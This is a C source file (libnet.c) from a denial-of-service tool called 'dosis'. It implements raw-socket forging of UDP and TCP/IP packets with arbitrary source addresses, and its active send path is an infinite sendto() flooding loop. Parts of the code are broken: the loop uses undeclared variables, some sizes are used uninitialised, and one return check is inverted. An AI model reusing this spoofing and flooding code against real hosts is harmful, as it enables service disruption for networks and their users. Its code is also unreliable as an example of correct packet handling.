/*****************************************************************************
 * libnet.c
 *
 * Libnet funcs.
 *
 * ---------------------------------------------------------------------------
 * dosis - DoS: Internet Sodomizer
 *   (C) 2008-2009 Gerardo García Peña <gerardo@kung-foo.net>
 *
 *   This program is free software; you can redistribute it and/or modify it
 *   under the terms of the GNU General Public License as published by the Free
 *   Software Foundation; either version 2 of the License, or (at your option)
 *   any later version.
 *
 *   This program is distributed in the hope that it will be useful, but WITHOUT
 *   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
 *   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
 *   more details.
 *
 *   You should have received a copy of the GNU General Public License along
 *   with this program; if not, write to the Free Software Foundation, Inc., 51
 *   Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *****************************************************************************/

#include <config.h>
#include "ip.h"
#include "lnet.h"
#include "log.h"

#define _LIBNET_ENABLED_ 1

/*****************************************************************************
 * SEQUENCE NUMBER GENERATORS
 *****************************************************************************/

unsigned ln_get_next_seq_random_port_number(unsigned *n)
{
  return (*n = NEXT_SSEQ_PORT(*n));
}

unsigned ln_get_next_random_port_number(unsigned *n)
{
  return (*n = NEXT_RAND_PORT(*n));
}

/*****************************************************************************
 * LN_CONTEXT MNGMNT
 *****************************************************************************/

void ln_init_context(LN_CONTEXT *lnc)
{
  char lnet_errbuf[LIBNET_ERRBUF_SIZE];

  if((lnc->ln = libnet_init(LIBNET_RAW4, NULL, lnet_errbuf)) == NULL)
    FAT("Cannot initialize libnet: %s", lnet_errbuf);
  lnc->udp_p = LIBNET_PTAG_INITIALIZER;
  lnc->tcp_p = LIBNET_PTAG_INITIALIZER;
  lnc->ipv4_p = LIBNET_PTAG_INITIALIZER;
  lnc->ip_id = libnet_get_prand(LIBNET_PRu32);

  if(libnet_seed_prand(lnc->ln) < 0)
    FAT("Faild to initialize libnet pseudorandom number generator.");

  if((lnc->rs = socket(PF_INET, SOCK_RAW, IPPROTO_IP)) < 0)
  {
    char err[1024];
    strerror_r(errno, err, sizeof(err));
    FAT("Cannot open a raw socket: %s", err);
  }

  if((lnc->buff = malloc(LN_DEFAULT_BUFF_SIZE)) == NULL)
    FAT("Cannot make space for local buffer.");
  lnc->buff_size = LN_DEFAULT_BUFF_SIZE;
}

void ln_destroy_context(LN_CONTEXT *lnc)
{
  if(lnc->ln)
    libnet_destroy(lnc->ln);
  if(lnc->rs)
    close(lnc->rs);
}

/*****************************************************************************
 * HELPER FUNCS
 *****************************************************************************/

void *ln_tcp_get_opt(void *msg, int sz, int sopt)
{
  void *p;
  unsigned opt, len;

  /* check msg size, protocol and headers */
  if(sz < sizeof(struct iphdr)
  || IP_PROTOCOL(msg) != 6
  || sz < sizeof(struct tcphdr) + (IP_HEADER(msg)->ihl << 2)
  || sz < (TCP_HEADER(msg)->doff << 2) + (IP_HEADER(msg)->ihl << 2))
    return NULL;

  /* go to options section and process them */
  for(p = msg + (IP_HEADER(msg)->ihl << 2) + sizeof(struct tcphdr);
      p < msg + (IP_HEADER(msg)->ihl << 2) + (TCP_HEADER(msg)->doff << 2); )
  {
    opt = *((unsigned char *) p);
    switch(opt)
    {
      case 0: /* end of option list */
        return opt == sopt ? p : NULL;
      case 1: /* NOP */
        len = 1;
        if(opt == sopt)
          return p;
        break;
      default:
        DBG("Uknown TCP option (%d).", opt);
      case 2: /* MSS                             */
      case 3: /* Window scale                    */
      case 4: /* SACK (selective acknowledgment) */
      case 8: /* Timestamps                      */
        if(opt == sopt)
          return p + 2;
        len = *((unsigned char *) (p + 1));
        break;
    }
    p += len;
  }

  return NULL;
}

int ln_tcp_get_mss(void *msg, int sz)
{
  void *p = ln_tcp_get_opt(msg, sz, 2);
  return p != NULL ? ntohs(*((unsigned short *) (p))) : -1;
}

/* this function generates header checksums */
unsigned short ln_ip_checksum(unsigned short *buf, int nwords)
{
  unsigned long sum;
  for(sum = 0; nwords > 0; nwords--)
    sum += *buf++;
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}


/*****************************************************************************
 * SENDING AND FORGING FUNCTIONS
 *****************************************************************************/

void ln_send_udp_packet(LN_CONTEXT *lnc,
                        INET_ADDR *shost, int sport,
                        INET_ADDR *dhost, int dport,
                        char *data, int datasz)
{
  int ip_size, udp_size;

  if(!datasz)
    data = NULL;
  udp_size = LIBNET_UDP_H + datasz;
  ip_size  = LIBNET_IPV4_H + udp_size;

  /* build UDP packet with payload (if requested) */
  lnc->udp_p =
    libnet_build_udp(
      sport,                    /* source port                               */
      dport,                    /* destination port                          */
      udp_size,                 /* len total length of the UDP packet        */
      0,                        /* sum checksum (0 for libnet to autofill)   */
      (unsigned char *) data,   /* payload                                   */
      datasz,                   /* payload size                              */
      lnc->ln,                  /* libnet context                            */
      lnc->udp_p);              /* protocol tag to modify an existing header */
  if(lnc->udp_p == -1)
    FAT("Can't build UDP header: %s", libnet_geterror(lnc->ln));

  /* build container IP packet */
  lnc->ipv4_p =
      libnet_build_ipv4(
        ip_size,             /* total length of packet (including data) */
        0x00,                /* type of service bits                    */
        lnc->ip_id++,        /* IP identification number                */
        0x4000,              /* fragmentation bits and offset           */
        64,                  /* time to live in the network             */
        IPPROTO_UDP,         /* upper layer protocol                    */
        0,                   /* checksum (0 for libnet to autofill)     */
        shost->addr.in.inaddr.s_addr, /* source IPv4 address (little endian)     */
        dhost->addr.in.inaddr.s_addr, /* destination IPv4 address (little endian)*/
        NULL,                /* payload                                 */
        0,                   /* payload length                          */
        lnc->ln,             /* libnet context                          */
        lnc->ipv4_p);        /* tag to modify an existing header        */
  if(lnc->ipv4_p == -1)
    FAT("Can't build IP header: %s", libnet_geterror(lnc->ln));

  /* send! */
  if(libnet_write(lnc->ln) == -1)
    FAT("Error sending packet: %s", libnet_geterror(lnc->ln));
}

int ln_build_ip_packet(void *buff,
                       INET_ADDR *shost,
                       INET_ADDR *dhost,
                       int proto, int ip_id,
                       char *data, int datasz,
                       int *pdata)
{
  int poffset = 0, psize;
  union {
    struct ip *v4;
    struct ip6_hdr *v6;
  } ip;

  /*
   * if(shost->type != dhost->type)
   * {
   *   ERR("Source address type (%d) is different from target address type (%d).",
   *       shost->type, dhost->type);
   *   return -1;
   * }
   */

  /* calculate packet size and payload offset */
  if(shost->type != INET_FAMILY_IPV6)
  {
    psize   = sizeof(struct ip) + datasz;
    poffset = sizeof(struct ip);
  } else {
    /* XXX TODO XXX */
    FAT("ipv6 not implemented.");
  }
  if(pdata)
    *pdata = poffset;
  if(!buff)
    return psize;

  /* fill ipv4 - at this point payload should be set */
  switch(shost->type)
  {
    case INET_FAMILY_IPV4:
      ip.v4 = (struct ip *) buff;
      ip.v4->ip_hl  = 5;
      ip.v4->ip_v   = 4;
      ip.v4->ip_tos = 0;
      ip.v4->ip_len = psize;
      ip.v4->ip_id  = htonl(ip_id); /* IP identification number                */
      ip.v4->ip_off = 0;
      ip.v4->ip_ttl = 255;
      ip.v4->ip_p   = proto;
      ip.v4->ip_src.s_addr = shost->addr.in.inaddr.s_addr;
      ip.v4->ip_dst.s_addr = dhost->addr.in.inaddr.s_addr;

      ip.v4->ip_sum = ln_ip_checksum((unsigned short *) buff, ip.v4->ip_len >> 1);
      break;
      
    case INET_FAMILY_IPV6:
      /* XXX TODO */
      FAT("ipv6 not implemented.");

    default:
      FAT("Unknown IP version %d.", shost->type);
  }

  return psize;
}

int ln_build_tcp_packet(void *buff,
                        int sport, int dport,
                        int flags, int window,
                        int seq, int ack,
                        char *data, int datasz,
                        char *opts, int optssz,
                        int *pdata)
{
  LN_TCP_HEADER *tcph;
  int psize, poffset;

  /* calculate packet size and payload offset */
  poffset = ((5 + ((optssz + 3) >> 2)) << 2);
  psize   = poffset + datasz;
  if(pdata)
    *pdata = poffset;
  if(!buff)
    return psize;

  tcph = (LN_TCP_HEADER *) buff;
  tcph->th_sport = htons(sport);
  tcph->th_dport = htons(dport);
  tcph->th_seq   = seq;
  tcph->th_ack   = ack;
  tcph->th_x2    = 0;
  tcph->th_off   = 5 + ((optssz + 3) >> 2);
  tcph->th_flags = flags;
  tcph->th_win   = htonl(window);
  tcph->th_sum   = 0;
  tcph->th_urp   = 0;
  if(opts && optssz > 0)
    memcpy(buff + 20, opts, optssz);
  if(data && datasz > 0)
    memcpy(buff + poffset, data, datasz);

  return psize;
}

int ln_build_ip_tcp_packet(void *buff,
                           INET_ADDR *shost, int sport,
                           INET_ADDR *dhost, int dport,
                           int ip_id,
                           int flags, int window,
                           int seq, int ack,
                           char *data, int datasz,
                           char *opts, int optssz,
                           char *pdata)
{
  int ip_size, tcp_size,
      tcp_offset, data_offset,
      psize;

  /* calculate size */
  if((tcp_size = ln_build_tcp_packet(NULL, sport, dport, flags, window, seq, ack,
                                     NULL, datasz, opts, optssz,
                                     &data_offset)) < 0
  || (ip_size = ln_build_ip_packet(NULL, shost, dhost, 6, ip_id,
                                   NULL, tcp_size, &tcp_offset)) < 0)
    return -1;

  /* check space */
  if(pdata)
    *pdata = tcp_offset + data_offset;
  if(!buff)
    return psize;

  /* buid packet */
  if(ln_build_tcp_packet(buff + tcp_offset,
                         sport, dport, flags, window, seq, ack,
                         data, datasz, opts, optssz,
                         NULL) < 0
  || ln_build_ip_packet(buff, shost, dhost, 6, ip_id, NULL, psize, NULL) < 0)
    return -1;

  return psize;
}

int ln_send_tcp_packet(LN_CONTEXT *lnc,
                       INET_ADDR *shost, int sport,
                       INET_ADDR *dhost, int dport,
                       int flags, int window,
                       int seq, int ack,
                       char *data, int datasz,
                       char *opts, int optssz)
{
  int size;

  if(ln_build_ip_tcp_packet(lnc->buff,
                            shost, sport, dhost, dport,
                            lnc->ip_id++,
                            flags, window, seq, ack,
                            data, datasz, opts, optssz,
                            NULL))
  {
    ERR("Cannot build TCP/IP package.");
    return -1;
  }
  ln_send_packet(lnc, lnc->buff, size);

#if 0
  tcp_size = LIBNET_TCP_H + datasz + opts_sz;
  ip_size  = LIBNET_IPV4_H + tcp_size;

  /* build container IP packet */
  lnc->ipv4_p =
      libnet_build_ipv4(
        ip_size,             /* total length of packet (including data) */
        0x00,                /* type of service bits                    */
        0x4000,              /* fragmentation bits and offset           */
        64,                  /* time to live in the network             */
        IPPROTO_TCP,         /* upper layer protocol                    */
        0,                   /* checksum (0 for libnet to autofill)     */
        shost->addr.in.inaddr.s_addr,       /* source IPv4 address (little endian)     */
        dhost->addr.in.inaddr.s_addr,       /* destination IPv4 address (little endian)*/
        NULL,                /* payload                                 */
        0,                   /* payload length                          */
        lnc->ln,             /* libnet context                          */
        lnc->ipv4_p);        /* tag to modify an existing header        */
  if(lnc->ipv4_p == -1)
    FAT("Can't build IP header: %s", libnet_geterror(lnc->ln));

  /* send! */
  if(libnet_write(lnc->ln) == -1)
    FAT("Error sending packet: %s", libnet_geterror(lnc->ln));
#else

  {                             /* lets do it the ugly way.. */
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
      printf ("Warning: Cannot set HDRINCL!\n");
  }

  while(1)
  {
    if(sendto(s,                        /* our socket                             */
              datagram,                 /* the buffer containing headers and data */
              iph->ip_len,              /* total length of our datagram           */
              0,                        /* routing flags, normally always 0       */
              (struct sockaddr *) &sin, /* socket addr, just like in              */
              sizeof (sin)) < 0)        /* a normal send()                        */
      printf ("error\n");
    else
      printf (".");
  }
#endif
}

